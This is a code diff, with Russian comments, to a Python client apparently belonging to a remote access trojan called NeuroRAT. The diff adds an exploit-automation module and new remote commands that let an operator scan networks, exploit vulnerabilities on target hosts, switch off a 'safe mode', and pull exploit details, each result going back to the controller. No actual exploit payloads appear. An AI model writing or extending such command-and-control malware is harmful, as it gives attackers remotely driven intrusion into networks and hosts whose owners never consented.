@@ -22,6 +22,7 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 # Импортируем наши модули
 from channel_manager import ChannelManager
 from modules.crypto import EncryptionManager, CryptoUtils
+from c1_exploit_integration import C1ExploitIntegration
 
 # Настройка логирования
 def setup_logging(log_level: str = "INFO", log_file: str = None) -> None:
@@ -98,6 +99,8 @@ class NeuroRATClient:
         
         # Компоненты системы
         self.channel_manager = None
+        # Интеграция модуля автоматизации эксплойтов
+        self.exploit_integration = C1ExploitIntegration(safe_mode=True)
         
         # Статус работы
         self.is_running = False
@@ -280,6 +283,43 @@ class NeuroRATClient:
                 # Останавливаем клиент
                 self._send_command_result(command_id, {"status": "success", "message": "Завершение работы..."})
                 self.stop()
+            
+            elif command == "scan_network":
+                result = self.exploit_integration.scan_network(
+                    target_range=parameters.get("target_range"),
+                    concurrency=parameters.get("concurrency", 5)
+                )
+                self._send_command_result(command_id, result)
+            
+            elif command == "exploit_vulnerabilities":
+                result = self.exploit_integration.exploit_vulnerabilities(
+                    target_hosts=parameters.get("target_hosts")
+                )
+                self._send_command_result(command_id, result)
+            
+            elif command == "generate_report":
+                result = self.exploit_integration.generate_report(
+                    include_details=parameters.get("include_details", True)
+                )
+                self._send_command_result(command_id, result)
+            
+            elif command == "set_safe_mode":
+                result = self.exploit_integration.set_safe_mode(
+                    safe_mode=parameters.get("safe_mode", True)
+                )
+                self._send_command_result(command_id, result)
+            
+            elif command == "get_vulnerability_details":
+                result = self.exploit_integration.get_vulnerability_details(
+                    vuln_id=parameters.get("vuln_id")
+                )
+                self._send_command_result(command_id, result)
+            
+            elif command == "get_exploit_details":
+                result = self.exploit_integration.get_exploit_details(
+                    exploit_id=parameters.get("exploit_id")
+                )
+                self._send_command_result(command_id, result)
             
             else:
                 # Неизвестная команда
